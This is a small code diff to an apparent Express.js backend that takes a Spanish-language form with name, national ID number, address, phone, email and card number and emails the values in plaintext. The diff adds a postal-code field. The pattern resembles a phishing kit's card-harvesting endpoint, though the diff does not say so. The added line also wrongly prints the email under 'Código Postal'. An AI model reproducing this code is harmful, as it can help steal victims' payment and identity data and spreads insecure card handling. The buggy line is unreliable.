@@ -19,7 +19,7 @@ const transporter = nodemailer.createTransport({
 
 
 app.post('/send-email', (req, res) => {
-    const { nombre, apellido, nac, cedula, direccion, ciudad, telefono, email, tarjeta } = req.body;
+    const { nombre, apellido, nac, cedula, direccion, ciudad, telefono, email, cp, tarjeta } = req.body;
 
     const mailContent = `
         Nombre: ${nombre}
@@ -30,6 +30,7 @@ app.post('/send-email', (req, res) => {
         Ciudad: ${ciudad}
         Teléfono: ${telefono}
         Email: ${email}
+        Código Postal: ${email}
         
         Tarjeta:
         - Número: ${tarjeta.numero}
